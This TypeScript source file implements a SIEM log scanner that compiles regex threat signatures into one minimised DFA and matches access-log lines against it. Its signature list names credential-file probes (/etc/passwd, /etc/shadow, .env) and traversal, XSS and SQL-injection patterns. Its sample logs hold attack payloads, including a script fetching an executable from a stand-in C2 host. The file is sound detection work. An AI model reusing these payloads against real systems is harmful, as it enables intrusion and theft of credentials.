/**
 * siemEngine.ts: True Single-Pass O(|w|) Multi-Rule Master DFA & SIEM Log Forensics Engine.
 *
 * Replaces the original O(K · |w|) per-rule loop with a genuine Moore-Machine
 * Multi-Output Master DFA compiled over unified alphabet minterms.
 */

import {
  ASTNode,
  CompiledDFA,
  DFAStateData,
  MintermClass,
  compileRegexPipeline,
  computeMintermsFromAST,
} from './automataEngine';

export interface SIEMRule {
  id: string;
  name: string;
  pattern: string;
  threatLevel: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  category: string;
  description: string;
}

export interface CompiledSIEMRule extends SIEMRule {
  ast: ASTNode;
  minimalDfa: CompiledDFA;
  stateCount: number;
}

export interface SinglePassTraceHop {
  index: number;
  char: string;
  fromMasterState: string;
  toMasterState: string;
  triggeredRuleIdsAtStep: string[];
}

export interface LogIncidentRecord {
  lineNumber: number;
  rawLine: string;
  ip: string;
  timestamp: string;
  method: string;
  uri: string;
  statusCode: number;
  highestThreat: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'SAFE';
  matchedRules: SIEMRule[];
  masterStateTrajectory: SinglePassTraceHop[];
  scanTimeMicros: number;
}

export interface MasterSIEMCompilation {
  rules: CompiledSIEMRule[];
  unifiedMinterms: MintermClass[];
  rawProductStateCount: number;
  minimizedMasterDfa: CompiledDFA;
  stateRuleMap: Map<number, string[]>;
  compileTimeMs: number;
}

export const DEFAULT_SIEM_SIGNATURES: SIEMRule[] = [
  {
    id: 'SEC-01',
    name: 'Executable Binary Drop over HTTP/S',
    pattern: '.*(http|https)://.*\\.(exe|msi|elf).*',
    threatLevel: 'HIGH',
    category: 'Malware Distribution',
    description: 'Detects executable binary downloads originating over HTTP or HTTPS.',
  },
  {
    id: 'SEC-02',
    name: 'Directory Traversal / LFI Payload',
    pattern: '.*(\\.\\./|\\.\\.\\\\)+.*',
    threatLevel: 'CRITICAL',
    category: 'Path Traversal',
    description: 'Identifies dot-dot-slash directory traversal sequences targeting host files.',
  },
  {
    id: 'SEC-03',
    name: 'Privileged Credential / Shadow File Probe',
    pattern: '.*(/etc/passwd|/etc/shadow|\\.env|wp-admin).*',
    threatLevel: 'HIGH',
    category: 'Credential Harvesting',
    description: 'Flags access attempts to sensitive system password files or environment secrets.',
  },
  {
    id: 'SEC-04',
    name: 'Remote Shell / Script Execution Vector',
    pattern: '.*\\.(sh|bat|ps1|cgi).*',
    threatLevel: 'CRITICAL',
    category: 'Remote Code Execution',
    description: 'Detects execution requests for shell, batch, PowerShell, or CGI scripts.',
  },
  {
    id: 'SEC-05',
    name: 'Cross-Site Scripting (XSS) Tag Injection',
    pattern: '.*(<script>|javascript:|onerror=).*',
    threatLevel: 'HIGH',
    category: 'Web Application Attack',
    description: 'Flags inline script tags and DOM event handler XSS payloads in request URIs.',
  },
  {
    id: 'SEC-06',
    name: 'SQL Injection Tautology / UNION Probe',
    pattern: ".*(' or '|union select|--\\+).*",
    threatLevel: 'CRITICAL',
    category: 'Database Security',
    description: 'Detects SQL authentication bypass tautologies and UNION SELECT injections.',
  },
];

export const SAMPLE_ACCESS_LOGS: string[] = [
  `192.168.10.42 - - [28/Oct/2026:10:14:02 +0000] "GET /api/v2/catalog?page=1 HTTP/1.1" 200 4520`,
  `10.44.19.8 - - [28/Oct/2026:10:14:05 +0000] "GET /assets/vendor/bundle.min.js HTTP/1.1" 200 18420`,
  `45.155.205.233 - - [28/Oct/2026:10:14:09 +0000] "GET /cgi-bin/../../etc/passwd HTTP/1.1" 403 284`,
  `185.220.101.14 - - [28/Oct/2026:10:14:11 +0000] "GET /search?q=<script>fetch('http://c2.io/drop.exe')</script> HTTP/1.1" 400 512`,
  `172.16.0.19 - - [28/Oct/2026:10:14:14 +0000] "POST /auth/login?user=admin' or '1'='1 HTTP/1.1" 401 198`,
  `198.51.100.77 - - [28/Oct/2026:10:14:18 +0000] "GET /downloads/update_patch.sh HTTP/1.1" 200 1024`,
  `10.0.14.99 - - [28/Oct/2026:10:14:21 +0000] "GET /healthz/readiness HTTP/1.1" 200 64`,
  `91.240.118.172 - - [28/Oct/2026:10:14:25 +0000] "GET /wp-admin/setup.php?redirect=http://mal.org/payload.msi HTTP/1.1" 404 310`,
];

/**
 * Compiles K SIEM rules into a single unified, Moore-minimized Master DFA.
 * Guarantees true O(|w|) single-pass scanning independent of rule count K.
 */
export function compileMasterSIEMAutomaton(rules: SIEMRule[]): MasterSIEMCompilation {
  const t0 = performance.now();

  const compiledRules: CompiledSIEMRule[] = rules.map((r) => {
    const res = compileRegexPipeline(r.pattern.toLowerCase());
    return {
      ...r,
      ast: res.ast,
      minimalDfa: res.minimalDfa,
      stateCount: res.minimalDfa.states.size,
    };
  });

  // Collect all character sets across all K rules to build unified disjoint Minterm classes
  const extraSets: Set<string>[] = [];
  for (const cr of compiledRules) {
    for (const mt of cr.minimalDfa.minterms) {
      if (!mt.isCatchAll) {
        extraSets.push(mt.chars);
      }
    }
  }

  const dummyWildcardAst: ASTNode = {
    id: 'master_root',
    kind: 'Wildcard',
    label: 'Σ',
    children: [],
  };
  const unifiedMinterms = computeMintermsFromAST(dummyWildcardAst, extraSets);

  // Synchronous Product Construction across all K minimal DFAs
  const TRAP = -1;
  const startTuple = compiledRules.map((cr) => cr.minimalDfa.startStateId);
  const tupleKey = (t: number[]) => t.join(',');

  const tupleToId = new Map<string, number>();
  const rawStates = new Map<number, DFAStateData>();
  const rawStateTags = new Map<number, string[]>();
  const queue: number[][] = [startTuple];

  const getMatchedRulesForTuple = (tuple: number[]): string[] => {
    const matched: string[] = [];
    tuple.forEach((sid, idx) => {
      if (sid !== TRAP && compiledRules[idx].minimalDfa.states.get(sid)?.isAccept) {
        matched.push(compiledRules[idx].id);
      }
    });
    return matched;
  };

  tupleToId.set(tupleKey(startTuple), 0);
  const startTags = getMatchedRulesForTuple(startTuple);
  rawStateTags.set(0, startTags);
  rawStates.set(0, {
    id: 0,
    name: 'S0',
    isStart: true,
    isAccept: startTags.length > 0,
    nfaStateIds: startTuple.filter((x) => x !== TRAP),
    powersetStateIds: [0],
    transitions: new Map(),
    charTransitions: new Map(),
    matchedRules: startTags,
  });

  // Cap product exploration at 180 states for instant interactive responsiveness
  const MAX_PRODUCT_STATES = 180;

  while (queue.length > 0 && rawStates.size < MAX_PRODUCT_STATES) {
    const currTuple = queue.shift()!;
    const currId = tupleToId.get(tupleKey(currTuple))!;
    const currState = rawStates.get(currId)!;

    for (const mt of unifiedMinterms) {
      const ch = mt.sampleChar;
      const nextTuple = currTuple.map((sid, idx) => {
        if (sid === TRAP) return TRAP;
        return compiledRules[idx].minimalDfa.states.get(sid)?.charTransitions.get(ch) ?? TRAP;
      });

      if (nextTuple.every((x) => x === TRAP)) continue;

      const nKey = tupleKey(nextTuple);
      let nextId = tupleToId.get(nKey);
      if (nextId === undefined) {
        if (rawStates.size >= MAX_PRODUCT_STATES) continue;
        nextId = rawStates.size;
        tupleToId.set(nKey, nextId);
        const tags = getMatchedRulesForTuple(nextTuple);
        rawStateTags.set(nextId, tags);
        rawStates.set(nextId, {
          id: nextId,
          name: `S${nextId}`,
          isStart: false,
          isAccept: tags.length > 0,
          nfaStateIds: nextTuple.filter((x) => x !== TRAP),
          powersetStateIds: [nextId],
          transitions: new Map(),
          charTransitions: new Map(),
          matchedRules: tags,
        });
        queue.push(nextTuple);
      }

      currState.transitions.set(mt.label, nextId);
      for (const c of mt.chars) {
        currState.charTransitions.set(c, nextId);
      }
    }
  }

  // Multi-Output Moore Machine Hopcroft Minimization:
  // Initial partition groups states by their exact matched rule-ID signature!
  const tagGroups = new Map<string, Set<number>>();
  for (const [sid, tags] of rawStateTags.entries()) {
    const key = tags.join('|');
    if (!tagGroups.has(key)) tagGroups.set(key, new Set());
    tagGroups.get(key)!.add(sid);
  }

  let partitions: Set<number>[] = Array.from(tagGroups.values());
  let changed = true;
  while (changed) {
    changed = false;
    const stateToBlock = new Map<number, number>();
    partitions.forEach((b, idx) => b.forEach((s) => stateToBlock.set(s, idx)));

    const nextPartitions: Set<number>[] = [];
    for (const block of partitions) {
      if (block.size <= 1) {
        nextPartitions.push(block);
        continue;
      }
      const subBlocks = new Map<string, Set<number>>();
      for (const sid of block) {
        const st = rawStates.get(sid)!;
        const sig = unifiedMinterms
          .map((mt) => {
            const tgt = st.transitions.get(mt.label);
            return tgt !== undefined ? String(stateToBlock.get(tgt) ?? -1) : '-1';
          })
          .join(',');
        if (!subBlocks.has(sig)) subBlocks.set(sig, new Set());
        subBlocks.get(sig)!.add(sid);
      }
      if (subBlocks.size > 1) changed = true;
      subBlocks.forEach((sb) => nextPartitions.push(sb));
    }
    partitions = nextPartitions;
  }

  // Synthesize Minimized Master DFA with canonical S0, S1, ...
  const blockList = partitions.map((b) => Array.from(b).sort((a, c) => a - c));
  const origToBlock = new Map<number, number>();
  blockList.forEach((b, idx) => b.forEach((s) => origToBlock.set(s, idx)));

  const startB = origToBlock.get(0) ?? 0;
  const canonicalOrder = [
    startB,
    ...blockList.map((_, idx) => idx).filter((idx) => idx !== startB),
  ];
  const blockToNewId = new Map<number, number>();
  canonicalOrder.forEach((bIdx, newId) => blockToNewId.set(bIdx, newId));

  const minMasterStates = new Map<number, DFAStateData>();
  const stateRuleMap = new Map<number, string[]>();

  for (const [bIdx, newId] of blockToNewId.entries()) {
    const members = blockList[bIdx];
    const rep = rawStates.get(members[0])!;
    const rulesForState = rawStateTags.get(members[0]) ?? [];
    stateRuleMap.set(newId, rulesForState);

    const transitions = new Map<string, number>();
    const charTransitions = new Map<string, number>();

    for (const mt of unifiedMinterms) {
      const origTgt = rep.transitions.get(mt.label);
      if (origTgt !== undefined) {
        const newTgt = blockToNewId.get(origToBlock.get(origTgt)!)!;
        transitions.set(mt.label, newTgt);
        for (const c of mt.chars) {
          charTransitions.set(c, newTgt);
        }
      }
    }

    minMasterStates.set(newId, {
      id: newId,
      name: `S${newId}`,
      isStart: newId === 0,
      isAccept: rulesForState.length > 0,
      nfaStateIds: rep.nfaStateIds,
      powersetStateIds: members,
      transitions,
      charTransitions,
      matchedRules: rulesForState,
    });
  }

  const minimizedMasterDfa: CompiledDFA = {
    kind: 'MINIMAL',
    startStateId: 0,
    states: minMasterStates,
    minterms: unifiedMinterms,
    alphabetLabels: unifiedMinterms.map((m) => m.label),
  };

  return {
    rules: compiledRules,
    unifiedMinterms,
    rawProductStateCount: rawStates.size,
    minimizedMasterDfa,
    stateRuleMap,
    compileTimeMs: performance.now() - t0,
  };
}

const LOG_REGEX =
  /^(\S+)\s+\S+\s+\S+\s+\[([^\]]+)\]\s+"([A-Z]+)\s+(.+?)(?:\s+HTTP\/\d\.\d)?"\s+(\d+)/;

/**
 * Executes a true O(|w|) single-pass deterministic scan over a log line or payload.
 */
export function scanLogLineSinglePass(
  master: MasterSIEMCompilation,
  rawLine: string,
  lineNumber: number
): LogIncidentRecord {
  const t0 = performance.now();
  const trimmed = rawLine.trim();
  const match = LOG_REGEX.exec(trimmed);

  let ip = '127.0.0.1';
  let timestamp = '28/Oct/2026:10:15:00 +0000';
  let method = 'PAYLOAD';
  let uri = trimmed;
  let statusCode = 200;

  if (match) {
    ip = match[1];
    timestamp = match[2];
    method = match[3];
    uri = match[4];
    statusCode = parseInt(match[5], 10);
  }

  const normalizedTarget = uri.toLowerCase();
  const dfa = master.minimizedMasterDfa;
  let currStateId = dfa.startStateId;

  const trajectory: SinglePassTraceHop[] = [];
  const triggeredRuleIds = new Set<string>();

  for (let i = 0; i < normalizedTarget.length; i++) {
    const ch = normalizedTarget[i];
    const fromSt = dfa.states.get(currStateId);
    const nextStateId = fromSt?.charTransitions.get(ch) ?? dfa.startStateId;
    const toSt = dfa.states.get(nextStateId);
    const stepRules = toSt?.matchedRules ?? [];
    stepRules.forEach((rid) => triggeredRuleIds.add(rid));

    trajectory.push({
      index: i + 1,
      char: uri[i],
      fromMasterState: `S${currStateId}`,
      toMasterState: `S${nextStateId}`,
      triggeredRuleIdsAtStep: stepRules,
    });

    currStateId = nextStateId;
  }

  const ruleMap = new Map(master.rules.map((r) => [r.id, r]));
  const matchedRules = Array.from(triggeredRuleIds)
    .map((id) => ruleMap.get(id)!)
    .filter(Boolean);

  const weights: Record<string, number> = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1 };
  let highestThreat: LogIncidentRecord['highestThreat'] = 'SAFE';
  for (const r of matchedRules) {
    if ((weights[r.threatLevel] ?? 0) > (weights[highestThreat] ?? 0)) {
      highestThreat = r.threatLevel;
    }
  }

  const scanTimeMicros = Math.max(1, Math.round((performance.now() - t0) * 1000));

  return {
    lineNumber,
    rawLine: trimmed,
    ip,
    timestamp,
    method,
    uri,
    statusCode,
    highestThreat,
    matchedRules,
    masterStateTrajectory: trajectory,
    scanTimeMicros,
  };
}
